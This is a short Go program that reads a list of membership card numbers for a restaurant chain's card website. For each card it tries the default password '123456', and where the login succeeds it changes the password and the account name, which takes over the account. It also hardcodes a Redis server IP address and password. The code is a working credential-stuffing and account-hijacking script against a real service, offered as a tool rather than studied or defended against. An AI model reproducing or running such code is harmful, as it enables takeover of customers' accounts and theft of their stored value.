package main

import (
	"bufio"
	"bytes"
	"github.com/go-redis/redis"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

func main() {

	//rd := redisUtil()

	file, _ := os.OpenFile("./NC2019021.txt", os.O_RDONLY, 0666)
	defer file.Close()

	reader := bufio.NewReader(file)

	for {
		line, _, err := reader.ReadLine()
		if err == io.EOF {
			break
		}
		t := string(line)
		log.Println(t)
		//rd.RPush("hdlCard-2019021", t)		入库
		//changeHdlPassword(string(list[0]))	修改密码
	}

}

func redisUtil() *redis.Client {
	rdb := redis.NewClient(&redis.Options{Addr: "175.27.243.243:6379", Password: "213879", DB: 0})
	return rdb
}

func changeHdlPassword(id string) {
	client := &http.Client{}

	// 登录
	req, _ := http.NewRequest("POST", "http://card.haidilao.net/TzxMember/tzx/getCardInfo", bytes.NewReader([]byte("username="+id+"&password=123456")))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, _ := client.Do(req)
	defer resp.Body.Close()
	ck := resp.Cookies()[0].Value
	bodyText, _ := ioutil.ReadAll(resp.Body)
	result := string(bodyText)
	if strings.Contains(result, "密码不正确") {
		return
	}
	log.Println(result, ck)

	// 修改密码
	req, _ = http.NewRequest("POST", "http://card.haidilao.net/TzxMember/tzx/updatePassword", bytes.NewReader([]byte("oldPwd=123456&name=hdl666&newPass=hdl666")))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", "JSESSIONID="+ck)
	resp, _ = client.Do(req)
	defer resp.Body.Close()
	bodyText, _ = ioutil.ReadAll(resp.Body)
	result = string(bodyText)
	if strings.Contains(result, "修改密码成功") {
		log.Println("修改成功")
	} else {
		log.Println("此号码已被使用 -> " + id)
	}
	log.Println("-----------------------------------------------------------------")
}
